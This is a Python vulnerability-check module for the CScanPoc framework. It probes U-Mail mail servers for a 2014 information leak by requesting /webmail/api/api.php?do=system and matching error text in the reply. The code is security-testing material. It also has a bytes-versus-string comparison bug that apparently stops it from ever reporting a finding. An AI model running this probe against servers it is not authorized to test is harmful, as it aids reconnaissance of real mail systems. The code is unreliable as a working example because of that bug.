# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'U-Mail_0008'  # 平台漏洞编号，留空
    name = 'U-Mail 20141124 /api/api.php 敏感信息泄漏'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-10-28'  # 漏洞公布时间
    desc = '''
        U-Mail专家级邮件系统是福洽科技最新推出的第四代企业邮局系统。该产品依托福洽科技在信息领域中领先的技术与完善的服务，专门针对互联网信息技术的特点，综合多行业多领域不同类型企业自身信息管理发展的特点，采用与国际先进技术接轨的专业系统和设备，将先进的网络信息技术与企业自身的信息管理需要完美的结合起来。
        U-Mail 20141124 /api/api.php 敏感信息泄露。
    '''  # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=070206'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'U-Mail'  # 漏洞应用名称
    product_version = '20141124'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'abf98d32-dbe2-401b-b597-71de11bdfecd'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/webmail/api/api.php?do=system'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if 'Warning' in content and 'system()' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
